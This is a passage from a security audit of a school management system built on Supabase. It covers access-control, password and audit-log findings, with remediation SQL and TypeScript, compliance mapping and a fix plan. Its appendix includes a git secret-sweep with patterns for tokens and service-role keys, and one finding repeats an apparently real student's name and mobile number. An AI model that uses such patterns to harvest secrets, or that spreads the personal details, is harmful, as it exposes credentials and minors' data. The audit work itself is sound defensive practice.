4. Add a one-shot purge migration in the client bootstrap: `for (const k of ['pws.demo.data.v3','pws.demo.data.v4','pws.showcase.data.v1']) localStorage.removeItem(k)` guarded by a schema-version bump, so existing devices are scrubbed.
5. Verify with PoC-3's FIXED assertions (raw blob must not match `/Student@|\d{4}-\d{2}-\d{2}|\+91/`).

---

### F-06 — `must_change_password` is never enforced; no change-password flow · **HIGH**

**Root cause.** The flag is set in all three provisioning paths (`admin-users/index.ts:137, 204`; `0001:11`; `create-admin.mjs:117`) and `scripts/create-admin.mjs:142` claims *"the console will ask for a new password at first sign-in"* — **but** `grep -rn "updateUser" apps packages` returns nothing and no route/guard reads `must_change_password` (only `database.types.ts` mentions it). `AuthContext.tsx:34` even hard-codes `must_change_password: false` for demo profiles.

**Impact.** Every derived initial password (F-01) and every admin bootstrap password remains valid indefinitely; the "forced rotation" control the design assumes does not exist.

**Fix.**

```tsx
// apps/admin/src/App.tsx — a hard gate, before the shell renders
function RequirePasswordRotation({ children }: { children: ReactNode }) {
  const { profile } = useAuth();
  const [rotating, setRotating] = useState(profile?.must_change_password ?? false);
  if (profile?.must_change_password || rotating) {
    return <ForcePasswordChange onDone={() => setRotating(false)} />;
  }
  return <>{children}</>;
}

// ForcePasswordChange.tsx
async function submit(current: string, next: string, confirm: string) {
  assertStrongPassword(next);                   // length ≥ 12, not the old one, not the login id
  await supabase.auth.signInWithPassword({      // re-authenticate first
    email: toAuthEmail(profile!.login_id), password: current,
  });
  const { error } = await supabase.auth.updateUser({ password: next });
  if (error) throw error;
  await supabase.from('profiles').update({ must_change_password: false }).eq('id', profile!.id);
}
```

Also: block all non-`profiles` queries until rotation completes (RLS cannot see the flag, so enforce it in every page's data hook **and** add a Postgres guard for defence in depth):

```sql
-- Reject PostgREST writes from an account that has not rotated yet.
CREATE OR REPLACE FUNCTION public.require_rotated_password() RETURNS void
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = ''
AS $$
BEGIN
  IF EXISTS (SELECT 1 FROM public.profiles WHERE id = auth.uid() AND must_change_password) THEN
    RAISE EXCEPTION 'password change required' USING ERRCODE = '42501';
  END IF;
END $$;
-- attach via a shared trigger on the sensitive tables (or per-table WITH CHECK).
```

The strongest form is to auto-expire the initial credential: `createUser({ ..., app_metadata: { provisioned_at } })` plus a scheduled job that deletes/rotates any account whose `must_change_password` is still true after 7 days.

---

### F-07 — Bulk import returns up to 200 plaintext passwords · **MEDIUM**

**Root cause.** `supabase/functions/admin-users/index.ts:220` — `results.push({ admissionNo, status: 'created', password })`. Nothing re-issues credentials, so the admin must copy these from the response; each response is one credential dump. Combined with F-01 the value is guessable anyway, but the response turns a guess into a certainty and lands in proxy/browser logs and HAR files.

**Fix.** Remove `password` from `ImportRow` results (see F-01 fix #3). Return `{ admissionNo, status, inviteSent: boolean }` and dispatch credentials through Supabase Auth's invite/reset flow. If your institution *requires* an offline hand-out, make it an explicit, separately-audited, one-at-a-time `reveal-credential` action that: (a) writes an `audit_log` row with the target's id, (b) returns a single credential, (c) is rate-limited, and (d) never includes it in a batch response.

---

### F-08 — Poll votes: no poll/option consistency, no audience check, no impersonation guard · **MEDIUM**

**Root cause.**

```sql
-- 0002_dashboard_modules.sql:372
CREATE POLICY "poll_votes_student_insert" ON poll_votes
  FOR INSERT WITH CHECK (auth.uid() = student_id);
```

No check that `option_id` belongs to `poll_id`, none that the poll is open or addressed to the caller, none that the caller is a student. The PK `(poll_id, student_id)` prevents double-voting on the same poll, but a client can send `poll_id = <poll A>` with `option_id` from **poll B** (no FK spanning the pair), producing a vote that renders under A but means nothing in B.

**Fix.**

```sql
ALTER TABLE public.poll_votes
  ADD CONSTRAINT poll_votes_option_in_poll
  FOREIGN KEY (poll_id, option_id)
  REFERENCES public.poll_options (poll_id, id)            -- requires the UNIQUE below
  ON DELETE CASCADE;

ALTER TABLE public.poll_options
  ADD CONSTRAINT poll_options_poll_id_id_key UNIQUE (poll_id, id);

DROP POLICY IF EXISTS poll_votes_student_insert ON public.poll_votes;
CREATE POLICY poll_votes_student_insert ON public.poll_votes
  FOR INSERT WITH CHECK (
    auth.uid() = student_id
    AND public.app_role() = 'student'
    AND EXISTS (
      SELECT 1 FROM public.polls p
      WHERE p.id = poll_votes.poll_id
        AND (p.closes_on IS NULL OR p.closes_on >= current_date)
        AND (
          cardinality(p.section_ids) = 0
          OR EXISTS (
            SELECT 1 FROM public.enrollments e
            WHERE e.student_id = auth.uid() AND e.section_id = ANY (p.section_ids)
          )
        )
    )
  );
```

Also enforce `results_visible` server-side rather than relying on the page to hide totals.

---

### F-09 — Audit log integrity and the false assurance in the UI · **MEDIUM**

**Root causes (four, compounding).**

1. **No actor binding.** `audit_log_admin_insert WITH CHECK (public.is_admin())` (`0004:88`) lets any admin insert any `actor_id`, any `action`, any `created_at`. Any admin can attribute an action to another admin.
2. **Mutable.** No `REVOKE UPDATE/DELETE` and no immutability trigger; the schema relies on the absence of a policy. `AuditLog.tsx:30` states *"Entries are read-only — admins cannot edit or delete them, on this page or in the database."* — a policy regression (e.g. someone re-adding `FOR ALL`) silently makes that false.
3. **Silent failure.** `admin-users/index.ts:146,225` and `create-admin.mjs:127` `await` the insert but **ignore `error`**; an audit write failure returns `{ ok: true }` to the caller. `service_role` bypasses RLS, so production failures are the realistic case, not policy denials.
4. **Unaudited reads/exports.** `People.tsx` CSV export (with plaintext passwords) and `Fees.tsx` export produce no audit entry, though the module advertises that reads are logged.

**Fix.**

```sql
BEGIN;
-- 1. Bind the actor to the session for non-service inserts.
DROP POLICY IF EXISTS audit_log_admin_insert ON public.audit_log;
CREATE POLICY audit_log_admin_insert ON public.audit_log
  FOR INSERT WITH CHECK (public.is_admin() AND actor_id = auth.uid());

-- 2. Make the table genuinely append-only, enforced by the database.
REVOKE UPDATE, DELETE, TRUNCATE ON public.audit_log FROM anon, authenticated;
CREATE OR REPLACE FUNCTION public.audit_log_immutable() RETURNS trigger
LANGUAGE plpgsql SET search_path = '' AS $$
BEGIN
  RAISE EXCEPTION 'audit_log is append-only (attempted %)', TG_OP USING ERRCODE = '42501';
END $$;
CREATE TRIGGER audit_log_no_mutation
  BEFORE UPDATE OR DELETE ON public.audit_log
  FOR EACH ROW EXECUTE FUNCTION public.audit_log_immutable();

-- 3. Server-side timestamp authority for non-service writes.
ALTER TABLE public.audit_log ALTER COLUMN created_at SET DEFAULT now();
COMMIT;
```

```ts
// 4. Never swallow an audit failure.
const { error: auditError } = await admin.from('audit_log').insert({ /* … */ });
if (auditError) {
  console.error('audit_write_failed', { action, auditError });
  return json({ error: 'Audit trail unavailable; action aborted' }, 503);
}
```

5. Emit an audit row for every export (`action: 'export-people-csv'`, `meta: { rows: n }`) and every failed authentication (a `login_attempts` table fed by a Postgres hook or an auth webhook). Purge policy: keep 12 months, ship to WORM/object-lock storage for the DPDP retention argument.
6. Copy fix: change `AuditLog.tsx` to say what the database *enforces*, and add an RLS test asserting `UPDATE`/`DELETE` fail for `authenticated` and `service_role` alike (the trigger covers both).

---

### F-10 — Notice read-receipts writable by any user · **MEDIUM**

**Root cause.**

```sql
-- 0001_initial_schema.sql:426
CREATE POLICY "notice_recipients_own_update" ON notice_recipients
  FOR UPDATE USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);
```

Unrestricted column UPDATE on your own receipt row: `read_at` can be **cleared** (destroying delivery evidence for a legal/safeguarding notice) and `notice_id`/`user_id` can be **rewritten** within the self-scope, allowing re-pointing a receipt.

**Fix.**

```sql
DROP POLICY IF EXISTS notice_recipients_own_update ON public.notice_recipients;
REVOKE UPDATE ON public.notice_recipients FROM anon, authenticated;
GRANT UPDATE (read_at) ON public.notice_recipients TO authenticated;

CREATE POLICY notice_recipients_mark_read ON public.notice_recipients
  FOR UPDATE USING (auth.uid() = user_id AND read_at IS NULL)   -- one-way
  WITH CHECK (auth.uid() = user_id AND read_at IS NOT NULL);    -- can only set it
```

---

### F-11 — Unmapped / unscoped authorization helpers · **MEDIUM**

**Root causes.**

1. `is_enrolled(p_student_id)` (`0001:215`) takes an arbitrary UUID and **never checks whether the student is the caller** — it is a cross-tenant existence oracle for any role, `anon` included (there is no `TO` clause, and no migration revokes it from `anon`; `0003` only touches function *EXECUTE*, and `is_enrolled` is not even used by any policy, so its grant is pure excess).
2. `class_teacher_of_section(target_section)` (`0002:23`) returns another section's teacher UUID to any caller.
3. `app_role()` is declared **without qualified types** (`profiles`/`auth.uid()` resolved through `search_path` at *creation* time), unlike every other helper; it is also not `public.`-qualified in the `0003` revoke. Combined with `0004:35` (`IF current_user IN ('service_role','postgres') OR public.is_admin()`) this is an invitation to a future privilege bug (F-14).
4. `is_enrolled`'s predicate is semantically wrong anyway: `e.academic_year IS NOT NULL` is true for every enrollment row, so the helper answers "is this user enrolled in anything" rather than "in the relevant section".

**Fix.**

```sql
BEGIN;
-- Revoke helpers nobody needs.
REVOKE ALL ON FUNCTION public.is_enrolled(uuid) FROM PUBLIC, anon, authenticated;
REVOKE ALL ON FUNCTION public.class_teacher_of_section(uuid) FROM PUBLIC, anon, authenticated;

-- If a scoped version is needed later, it must be caller-bound:
CREATE OR REPLACE FUNCTION public.is_self_enrolled(p_student_id uuid) RETURNS boolean
LANGUAGE sql STABLE SECURITY DEFINER SET search_path = '' AS $$
  SELECT p_student_id = auth.uid()
     AND EXISTS (SELECT 1 FROM public.enrollments e WHERE e.student_id = auth.uid());
$$;
REVOKE ALL ON FUNCTION public.is_self_enrolled(uuid) FROM PUBLIC, anon;
GRANT EXECUTE ON FUNCTION public.is_self_enrolled(uuid) TO authenticated;

-- Harden app_role() in line with the others.
CREATE OR REPLACE FUNCTION public.app_role() RETURNS text
LANGUAGE sql STABLE SECURITY DEFINER SET search_path = '' AS $$
  SELECT p.role::text FROM public.profiles p WHERE p.id = auth.uid();
$$;
COMMIT;
```

Also add an explicit `TO authenticated` to every policy (`CREATE POLICY … TO authenticated USING …`) so `anon` is denied by construction, and add a test that asserts `relrowsecurity` for **every** table (see F-18).

**Directory note.** `0004` correctly removed the blanket `profiles_read_active`. If the product needs classmate/teacher names, add a *minimal* projection via a view (`security_invoker`, exposing `id, full_name, role` only for sections you share) — do not restore the blanket policy.

---

### F-12 — Library tables writable by every teacher · **MEDIUM**

**Root cause.** `books_staff_write` and `book_issues_staff_write` are `FOR ALL` gated only on `app_role() IN ('teacher','admin')` (`0002:396, 401`). Every teacher can delete the catalogue and fabricate issues/fines for any student; `issued_by` is not bound to `auth.uid()`; `returned_on`/`fine_amount` can be back-dated arbitrarily. The app's own design rule is "teachers manage their own scope".

**Fix.**

```sql
BEGIN;
DROP POLICY IF EXISTS books_staff_write ON public.books;
CREATE POLICY books_admin_write ON public.books
  FOR ALL TO authenticated USING (public.is_admin()) WITH CHECK (public.is_admin());
CREATE POLICY books_staff_read ON public.books
  FOR SELECT TO authenticated USING (true);

DROP POLICY IF EXISTS book_issues_staff_write ON public.book_issues;
CREATE POLICY book_issues_librarian_insert ON public.book_issues
  FOR INSERT TO authenticated
  WITH CHECK (public.is_admin() AND issued_by = auth.uid());
CREATE POLICY book_issues_librarian_return ON public.book_issues
  FOR UPDATE TO authenticated
  USING (public.is_admin() AND issued_by = auth.uid())
  WITH CHECK (public.is_admin() AND issued_by = auth.uid());
-- No DELETE: returns are recorded, not erased. (Add a librarian role if
-- staff other than admins must run circulation.)
COMMIT;
```

If teachers genuinely circulate books, add a `librarian boolean` to a `staff_roles` table (not to `profiles`, which is privilege-protected) and scope on it.

---

### F-13 — Data residency & transfer of minors' records · **MEDIUM**

**Observations.** Postgres/Auth/Edge Functions default to a Supabase region chosen at project creation; a Vercel-hosted SPA adds a second processor. Nothing in the repo records the chosen region, the DPA, or a retention schedule. India's Digital Personal Data Protection Act 2023 applies (children's data: verifiable parental consent, no behavioural tracking/targeted advertising), and §16(1) empowers the Government to notify **restricted countries** for transfers; the draft DPDP Rules (Rule 15(2)) would require reasonable security safeguards for cross-border processing.

**Actions.**

1. Record the Supabase project region and put it in `docs/security/`; if it is not `ap-south-1`, plan a migration and document the transfer assessment.
2. Execute DPAs with Supabase and Vercel; record sub-processors.
3. Define retention for `audit_log`, `messages`, `leave_requests` (medical data), `fee_records`.
4. Implement verifiable parental consent capture for student accounts (the declaration-signature table is the natural home — **after** F-02 is fixed, since it is currently forgeable).
5. On erasure/graduation, cascade-delete (`profiles` → `auth.users` already cascades) and record the audit entry.

---

### F-14 — Authorization-trigger hardening · **LOW**

1. **`protect_profile_privileges` self-exempts via role name** (`0004:35`): `current_user IN ('service_role','postgres')` returns `NEW` unconditionally, *before* the protected-column check. Any future path that runs as `service_role` (an Edge Function taking a client-supplied row, a `SECURITY DEFINER` wrapper, a misconfigured cron) inherits an unconditional bypass. Encode the intended rule explicitly:

```sql
CREATE OR REPLACE FUNCTION public.protect_profile_privileges() RETURNS trigger
LANGUAGE plpgsql SECURITY INVOKER SET search_path = '' AS $$
BEGIN
  -- service_role / owner are the provisioning path: allow, but record it.
  IF current_user IN ('service_role', 'postgres') THEN
    RETURN NEW;
  END IF;
  IF public.is_admin() THEN
    RETURN NEW;                    -- admins may manage others; audited by app
  END IF;
  IF NEW.role        IS DISTINCT FROM OLD.role
  OR NEW.is_active   IS DISTINCT FROM OLD.is_active
  OR NEW.login_id    IS DISTINCT FROM OLD.login_id
  OR NEW.created_at  IS DISTINCT FROM OLD.created_at THEN
    RAISE EXCEPTION 'permission denied: privileged profile columns are protected'
      USING ERRCODE = '42501';
  END IF;
  RETURN NEW;
END $$;
```

2. `reject_self_approval` (`0002:445`) checks only `OLD.student_id = auth.uid()` and only the `'approved'` transition; also pin `SET search_path = ''` and invert to an allow-list:

```sql
CREATE OR REPLACE FUNCTION public.guard_leave_decision() RETURNS trigger
LANGUAGE plpgsql SET search_path = '' AS $$
BEGIN
  IF NEW.status IS DISTINCT FROM OLD.status THEN
    IF auth.uid() = OLD.student_id THEN
      RAISE EXCEPTION 'a student cannot decide their own leave request' USING ERRCODE = '42501';
    END IF;
    IF NEW.decided_by IS DISTINCT FROM auth.uid() THEN
      RAISE EXCEPTION 'decided_by must be the acting teacher' USING ERRCODE = '42501';
    END IF;
    NEW.decided_on := now();       -- server authority for the decision time
  END IF;
  RETURN NEW;
END $$;
```

3. `touch_updated_at` (`0002:462`) — add `SET search_path = ''`; make it `SECURITY INVOKER` explicitly.
4. Every trigger function should be `REVOKE ALL … FROM PUBLIC` like the helpers.

---

### F-15 — Edge Function / supply-chain hardening · **LOW**

1. **Unexpected exceptions leak as 500 with Deno's default body.** Wrap the handler:

```ts
Deno.serve(async (req) => {
  try {
    return await handle(req);
  } catch (err) {
    console.error('admin-users_unhandled', { name: (err as Error)?.name });
    return json({ error: 'Internal error' }, 500);   // never err.message/stack
  }
});
```

2. **CORS `*`** (`_shared/cors.ts`). Justified by JWT+role checks, but unnecessary: pin the origin.

```ts
const ALLOWED = new Set([
  'https://admin.pacificworldschool.in',
  'http://localhost:5173',
]);
export function corsFor(req: Request): Record<string, string> {
  const origin = req.headers.get('origin') ?? '';
  return {
    'Access-Control-Allow-Origin': ALLOWED.has(origin) ? origin : 'null',
    'Vary': 'Origin',
    'Access-Control-Allow-Headers': 'authorization, apikey, content-type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };
}
```

3. **Floating CDN import.** `https://esm.sh/@supabase/supabase-js@2.45.0` executes third-party code inside your server boundary with no integrity check. Vendor it: `import { createClient } from 'npm:@supabase/supabase-js@2.45.0'` (Supabase's own npm specifier, resolved at deploy) and set `deno.lock`. Unify the client version across admin/mobile/edge.
4. **`verify_jwt`** is unset in `supabase/config.toml`. Declare it explicitly so it cannot drift:

```toml
[functions.admin-users]
verify_jwt = true
```

5. **Rate limiting / abuse.** `create-admin` and `import-students` create auth users; add per-caller quotas (e.g. 5 admins/hour, 2 imports/hour) and alert on bursts — an admin token used by malware must not be able to mint 10,000 identities.
6. `loginId` is not validated for length/format before becoming an email local part; add `^[A-Za-z0-9][A-Za-z0-9._/-]{1,31}$` and reject duplicates explicitly (today duplicates surface as an `auth.admin.createUser` error string, which is itself an enumeration oracle for an admin).

---

### F-16 — Realistic PII in shipped seed data · **LOW**

`apps/admin/src/lib/seed.ts:105-118` ships a full name (`Sahaj Chugh` — matching the repository owner handle) with mobile number `+91 99909 23008`, DOB, admission number and derived password; several other rows carry `+91 98100 …` numbers. This is bundled into every Vercel build (demo route) and into `localStorage`.

**Fix.** Replace identifiable data with obviously synthetic values (`Student One`, `+91 00000 00000`, `1990-01-01`), delete the `password` field (F-01), and add a CI check that rejects `\+91 9\d{4} \d{5}` in `apps/**/seed.ts`.

---

### F-17 — Fragile escaping on `document.write` sinks · **LOW**

`escapeHtml` is applied at both call sites (`ReportCard.tsx:106-132`, `StudyRoom.tsx:24-31`), and the live code is safe. Two latent problems:

1. `printHtml(title, body)` accepts a **pre-built HTML string** — the "escape everything" contract is unenforceable by the type system, and the guardrail is a comment.
2. The ESLint rule intended to protect these sinks **does not match them** (`apps/admin/eslint.config.js`: `CallExpression[callee.property.name='write']` also fires on `localStorage.setItem`-style `.write`; the real sinks are `win.document.write` and are suppressed with an `eslint-disable-next-line` anyway — so the rule is both over-broad and bypassed).

**Fix.** Make the sink structurally safe:

```ts
export type SafeHtml = string & { readonly __safeHtml: unique symbol };
export const safe = (v: unknown): SafeHtml => escapeHtml(v) as SafeHtml;

export function printDocument(title: string, parts: { html: SafeHtml }[]): void {
  const body = parts.map((p) => p.html).join('');
  // …only SafeHtml reaches document.write; a raw string is a type error.
  win.document.write(shell(escapeHtml(title), body));
}
```

And replace the ESLint selector with a precise one (`CallExpression[callee.object.property.name='document'][callee.property.name='write']`) plus `no-template-curly-in-string` and an `escape-html`-only import rule.

---

### F-18 — CI does not analyse the security-critical surfaces · **LOW**

`ci.yml` runs typecheck, lint, admin tests, build and secret-name greps. It does **not**: apply migrations, run the pgTAP/RLS suite (`npm run verify:rls`), lint SQL, scan the Edge Function, or gate on `npm audit`. CodeQL's `javascript-typescript` pack does not reason about RLS policies. So the code that actually protects PII is untested in CI.

**Fix.** Add jobs:

```yaml
  rls:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-python@<sha>
        with: { python-version: '3.12' }
      - run: pip install pgserver
      - run: python supabase/tests/verify_rls_local.py     # must print ALL PASS
      - name: every table has RLS
        run: |
          grep -c "ENABLE ROW LEVEL SECURITY" supabase/migrations/*.sql
          # plus a pg query asserting relrowsecurity for all public tables
  deps:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
      - run: npm ci
      - run: npm audit --audit-level=high        # fail, do not warn
  sql-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm i -g sqlfluff && sqlfluff lint supabase/migrations --dialect postgres
```

Also add a test that enumerates `pg_tables` and asserts `relrowsecurity` and at least one policy for every table — this catches the "new table without RLS" class that `AGENTS.md` rule 3 tries to prevent by convention.

---

## 6. Phase 6 — Executive summary & compliance mapping

### 6.1 Findings × standards

| # | Sev | OWASP Top 10 | OWASP ASVS 4.0 | NIST AI RMF 1.0 | ISO/IEC 42001:2023 | DPDP Act 2023 / Rules |
|---|---|---|---|---|---|---|
| F-01 | Critical | A02, A07, A04 | V2.1, V2.2, V2.5, V8.3 | GOVERN-1.2, MANAGE-2.4 | A.6.1.3, A.9.2 | §8(4) security safeguards; Rule 15(2) |
| F-02 | Critical | A01 | V4.1, V4.2, V8.2 | MANAGE-2.4 | A.6.1.2, A.8.2 | §6(1) consent (parental, §9) |
| F-03 | High | A01, A04 | V4.1, V4.3 | MANAGE-2.4 | A.6.1.2 | §6(1)(a) purpose limitation |
| F-04 | High | A01, A07 | V4.2, V8.2 | MANAGE-2.4, MAP-3.4 | A.6.1.4 | §8(4) |
| F-05 | High | A02, A05 | V8.1, V8.3, V14.2 | MAP-1.5, MANAGE-2.1 | A.9.3, A.8.4 | §8(4), §8(5) breach |
| F-06 | High | A07 | V2.1, V2.5, V3.7 | MANAGE-1.3 | A.6.2.5 | §8(4) |
| F-07 | Med | A02, A09 | V8.3, V7.1 | MANAGE-2.1 | A.8.4 | §8(4) |
| F-08 | Med | A01, A04 | V4.1, V4.3 | — | A.6.1.2 | §6(1)(a) |
| F-09 | Med | A09, A08 | V7.1, V7.2, V7.4 | GOVERN-3.2, MANAGE-4.1 | A.6.2.6, A.9.4 | §8(4) accountability |
| F-10 | Med | A01 | V4.1 | — | A.6.1.2 | §8(4) |
| F-11 | Med | A01, A05 | V4.1, V8.2 | MAP-3.4 | A.6.1.2 | §8(4) |
| F-12 | Med | A01 | V4.1, V4.3 | — | A.6.1.2 | §8(4) |
| F-13 | Med | A05 | V14.1 | MAP-4.2, GOVERN-6.1 | A.9.1, A.9.2 | **§16(1) + Rule 15(2)** |
| F-14 | Low | A08 | V5.1, V5.3 | — | A.8.3 | §8(4) |
| F-15 | Low | A05, A06, A09 | V14.2, V8.3, V7.1 | MANAGE-1.3 | A.7.4, A.9.2 | §8(4) |
| F-16 | Low | A02, A05 | V8.3 | MAP-1.5 | A.9.3 | §8(4) |
| F-17 | Low | A03 | V5.3.3, V1.14 | — | A.8.3 | §8(4) |
| F-18 | Low | A06, A09 | V14.2, V7.1 | GOVERN-2.1, MANAGE-3.1 | A.6.2.6 | §8(4) |

### 6.2 NIST AI RMF function view

Because there is no AI system in scope, the RMF mapping is a *readiness* posture for the day an LLM/tutor/MCP integration is added:

- **GOVERN** — `AGENTS.md` is an effective, enforceable policy document (secret-free clients, RLS-first, server-side targeting). Extend it with: "no model output may reach a shell/SQL/HTML sink unescaped", "every agent/tool credential is per-user and short-lived", "every prompt template is versioned and reviewed".
- **MAP** — this report is the inventory artefact; keep it current as F-01…F-18 close.
- **MEASURE** — add the RLS suite + `npm audit` to CI (F-18) and the canary tests in §4.6 as automated probes.
- **MANAGE** — hotfix list below, with owners and a re-test date.

### 6.3 Prioritised plan

**Immediate hotfixes (≤72 h) — all reversible, all test-covered**

| Order | Action | Findings | Effort |
|---|---|---|---|
| 1 | Replace `passwordFromDob` with cryptographic random passwords server-side; delete it from `apps/`, `packages/`, `scripts/`; strip the `password` field and every UI/CSV surface | F-01, F-07 | 1–2 d |
| 2 | Ship a forced first-login password rotation gate; re-issue/expire all existing student + admin credentials | F-01, F-06 | 1 d |
| 3 | Migration `0005_authorization_hardening.sql`: declaration signatures, poll options/votes, notice receipts, books/book_issues, helper revokes (all snippets in §5) | F-02, F-03, F-08, F-10, F-11, F-12 | 1 d |
| 4 | Decouple `viewAsRole` from `isAdmin`/`requireRole`; refuse for non-admins | F-04 | 2 h |
| 5 | Stop persisting `people` PII to `localStorage`; purge existing keys | F-05 | 3 h |
| 6 | Stop swallowing `audit_log` insert errors; make the table append-only | F-09 | 2 h |
| 7 | Re-run `supabase/tests/verify_rls_local.py` + add the F-02/F-03/F-08 negative cases | all | 4 h |

**Architectural hardening (this quarter)**

1. **Redesign identity**: random one-time credentials delivered out-of-band, mandatory rotation, MFA for `admin` (Supabase MFA is available), self-service reset with server-side rate limiting, and a `login_attempts`/failed-auth monitor.
2. **Make the database the only authority**: add `TO authenticated` to every policy, add a "no table without RLS + policy" CI assertion, add actor-bound audit writes, drop every helper no policy uses.
3. **Data minimisation**: remove DOB/phone from role-obvious reads; serve student PII through narrow, audited views; add a `student_details` column grant so teachers read `full_name` without `date_of_birth`.
4. **Explicit directory model**: if classmates/teachers must be discoverable, ship a `security_invoker` view exposing only shared-section `id, full_name, role`.
5. **Platform**: pin the Supabase project region, sign DPAs, set retention/purge, add storage buckets + policies if the `*_path` columns are to be used (today they are dangling references).
6. **Supply chain**: vendor the Edge Function dependency, set `deno.lock`, unify `@supabase/supabase-js` versions, make `npm audit` a failing gate, either implement `zod` validation or drop the dependency.
7. **The day you add an LLM/tutor/MCP server**: enforce (a) tool credentials are the *user's* token, never a service role; (b) model output is data, never instruction, at every boundary; (c) all retrieval content is wrapped in structural delimiters and never concatenated into system prompts; (d) every tool call is authorized server-side against RLS, with the model treated as an untrusted client. Everything in §1.2's trust-boundary note applies verbatim and more strongly.

---

## Appendix A — Reproduction & evidence index

```bash
# environment used for this audit
cd /home/user/schoolerp && npm ci            # 762 packages
npm audit --audit-level=moderate             # found 0 vulnerabilities

# executable proofs (4 tests, currently green — they assert the *insecure* behaviour)
cd apps/admin && npx vitest run              # 3 files, 14 tests passed
npx vitest run tests/poc-security.test.tsx   # PoC-1, PoC-2, PoC-3

# database-level verification (owner, needs a throwaway Postgres)
python3 -m venv .venv && .venv/bin/pip install pgserver
.venv/bin/python supabase/tests/verify_rls_local.py     # expect: ALL PASS

# secret sweep over all history (0 hits)
git rev-list --all | while read c; do
  git grep -nEI 'eyJhbGciOi|sbp_[A-Za-z0-9]{20,}|sk-[A-Za-z0-9]{20,}|SUPABASE_SERVICE_ROLE_KEY=[A-Za-z0-9]' "$c" -- . ;
done | sort -u
```

**Limitations.** No live Supabase project was contacted (out of scope, and probing a deployed school system is not appropriate here); Postgres was unavailable in this sandbox, so RLS findings are derived from policy text plus the project's own documented `authenticated` grants (`supabase/tests/verify_rls_local.py` mirrors Supabase defaults). `apps/mobile` is a bare Expo template — no application logic exists to assess. Column-level `GRANT`s in `0004` are only effective if they run **after** any broader grant; confirm on staging that `verify_rls_local.py`'s blanket `GRANT … ON all tables` is not what ships to production.

## Appendix B — Files reviewed

`AGENTS.md`, `PROJECT_STATUS.md`, `package.json`, `vercel.json`, `.github/workflows/{ci,codeql,ossar,codacy}.yml`, `supabase/config.toml`, `supabase/migrations/0001–0004`, `supabase/functions/admin-users/index.ts`, `supabase/functions/_shared/cors.ts`, `supabase/tests/*`, `scripts/create-admin.mjs`, `packages/shared/src/{supabase,targeting,database.types,index}.ts`, `apps/admin/vite.config.ts`, `apps/admin/eslint.config.js`, `apps/admin/.oxlintrc.json`, `apps/admin/index.html`, `apps/admin/src/{App,main}.tsx`, `apps/admin/src/contexts/AuthContext.tsx`, `apps/admin/src/lib/{supabase,demo,utils,types,appData,seed}.ts(x)`, `apps/admin/src/components/{AppShell,ui}.tsx`, `apps/admin/src/pages/{Login,People,AuditLog,ReportCard,StudyRoom,Fees}.tsx`, `apps/admin/tests/*`, `apps/mobile/{App.tsx,app.json,package.json,.claude/settings.json,.env.example}`, `docs/audits/*`, `docs/security/*`.
